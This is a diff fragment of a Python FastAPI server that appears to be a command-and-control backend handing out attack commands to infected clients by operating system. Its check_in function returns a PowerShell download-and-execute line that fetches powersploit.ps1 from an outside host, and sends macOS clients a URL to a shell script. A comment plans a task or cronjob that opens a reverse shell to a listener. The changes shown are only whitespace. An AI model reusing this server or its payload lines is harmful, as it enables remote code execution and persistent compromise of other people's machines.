@@ -5,6 +5,7 @@ from pydantic import BaseModel
 from datetime import datetime
 from datetime import date
 from time import sleep, strftime, time
+
 app = FastAPI()
 
 
@@ -89,7 +90,7 @@ async def check_in(check_in_result:CheckIn_Info,background_tasks: BackgroundTask
 		test_command = {"powershell":'''IEX(New-Object Net.WebClient).downloadString("Http://gotyou.com/powersploit.ps1")'''}
 		print("PowerShell Command Sent...")
 		return test_command
-		
+
 	elif check_in_dict["OS"] == "MACOS":
 		send = {"url":"http://127.0.0.1/test.sh"}
 		print("Sent bash command")
@@ -103,14 +104,6 @@ async def check_in(check_in_result:CheckIn_Info,background_tasks: BackgroundTask
 		return {"Error":"OS Not detected"}
 	
 	return {"test"} # end of checkin function
-
-
-
-
-
-
-
-
 
 
 
@@ -136,6 +129,11 @@ async def gathering(gathering:GatheringParams):
 async def rev_shell_endpoint(rev_shell:Shell):
 	print("test")
 	## for last step which is creating task or cronjob to attempt to reverse shell to listener
+
+
+
+
+
 
 
 
